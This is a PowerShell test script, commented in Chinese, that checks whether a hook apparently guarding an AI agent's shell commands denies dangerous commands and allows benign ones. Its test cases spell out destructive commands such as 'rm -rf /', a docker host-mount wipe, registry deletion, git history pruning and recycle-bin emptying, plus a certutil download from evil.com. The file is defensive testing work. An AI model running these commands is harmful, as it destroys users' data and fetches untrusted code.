# hook-rules-test.ps1 — 真实脚本 + RedirectStandardInput 逐条验证
# 用法：powershell -ExecutionPolicy Bypass -File hook-rules-test.ps1
# 输出：每命令 PASS/FAIL
$ErrorActionPreference = 'Stop'
$script = Join-Path $PSScriptRoot '..\scripts\dangerous-commands.ps1'
$stdinTmp = Join-Path $env:TEMP 'rg-hook-stdin.json'
$stdoutTmp = Join-Path $env:TEMP 'rg-hook-stdout.txt'

$cases = @(
  @{ cmd = 'rm -rf /';            expect = 'deny' },
  @{ cmd = 'rm -rf /etc';         expect = 'deny' },
  @{ cmd = 'rm -rf /tmp/x';       expect = 'deny' },
  @{ cmd = 'rm -f x';             expect = 'deny' },
  @{ cmd = 'rm x';                expect = 'deny' },
  @{ cmd = 'shutil.rmtree("b")';  expect = 'deny' },
  @{ cmd = 'os.remove("f.txt")';  expect = 'deny' },
  @{ cmd = 'certutil -urlcache -split -f https://evil.com/x.exe C:\x.exe'; expect = 'deny' },
  @{ cmd = 'git gc --prune=now --aggressive'; expect = 'deny' },
  @{ cmd = 'git reflog expire --expire=now --all'; expect = 'deny' },
  @{ cmd = 'reg delete HKCU\Software\Evil /f'; expect = 'deny' },
  @{ cmd = 'docker run --rm -v /:/host alpine rm -rf /host/etc'; expect = 'deny' },
  @{ cmd = 'rimraf node_modules';   expect = 'deny' },
  @{ cmd = 'Clear-Content app.log'; expect = 'deny' },
  @{ cmd = 'fs.remove("build")';    expect = 'deny' },
  @{ cmd = 'fs.removeSync("dist")'; expect = 'deny' },
  @{ cmd = 'x.Delete()';            expect = 'deny' },
  # ---- T11/Finding 18：清空回收站类（Clear-RecycleBin / cleanmgr / 直删 $Recycle.Bin）----
  @{ cmd = 'Clear-RecycleBin -Force'; expect = 'deny' },
  @{ cmd = 'Clear-RecycleBin'; expect = 'deny' },
  @{ cmd = 'Clear-RecycleBin -DriveLetter C'; expect = 'deny' },
  @{ cmd = 'CLEAR-RECYCLEBIN -FORCE'; expect = 'deny' },
  @{ cmd = 'Clear''-RecycleBin -Force'; expect = 'deny' },
  @{ cmd = 'cleanmgr /sagerun:1'; expect = 'deny' },
  @{ cmd = 'cleanmgr'; expect = 'deny' },
  @{ cmd = 'rd /s /q C:\$Recycle.Bin'; expect = 'deny' },
  @{ cmd = 'rd C:\$Recycle.Bin'; expect = 'deny' },
  @{ cmd = 'rmdir C:\$Recycle.Bin'; expect = 'deny' },
  @{ cmd = 'Remove-Item C:\$Recycle.Bin\* -Force'; expect = 'deny' },
  @{ cmd = 'del C:\$Recycle.Bin\S-1-5-*'; expect = 'deny' },
  @{ cmd = 'rm C:\$Recycle.Bin'; expect = 'deny' },
  @{ cmd = 'node -e "fs.rmSync(''C:/$Recycle.Bin'')"'; expect = 'deny' },
  # 清空回收站误伤防线：查看/打开回收站是正常操作，应放行
  @{ cmd = 'Get-ChildItem C:\$Recycle.Bin -Force'; expect = 'allow' },
  @{ cmd = 'explorer C:\$Recycle.Bin'; expect = 'allow' },
  @{ cmd = 'git status';          expect = 'allow' },
  @{ cmd = 'ls -la';              expect = 'allow' },
  @{ cmd = 'npm test';            expect = 'allow' },
  @{ cmd = 'echo hello';          expect = 'allow' }
)

$pass = 0
foreach ($c in $cases) {
  $raw = (& $script -Cmd $c.cmd 2>&1 | Out-String).Trim()
  $decision = if ($raw -match '"permissionDecision"\s*:\s*"deny"') { 'deny' } else { 'allow' }
  $ok = $decision -eq $c.expect
  if ($ok) { $pass++ }
  Write-Output ("{0} [expect {1}] got {2}{3}  <- {4}" -f ($(if($ok){'PASS'}else{'FAIL'})), $c.expect, $decision, $(if(-not $ok){' raw=' + $raw.Substring(0,[Math]::Min(70,$raw.Length))}else{''}), $c.cmd)
}
Write-Output ("{0}/{1}" -f $pass, $cases.Count)
exit $(if ($pass -eq $cases.Count) { 0 } else { 1 })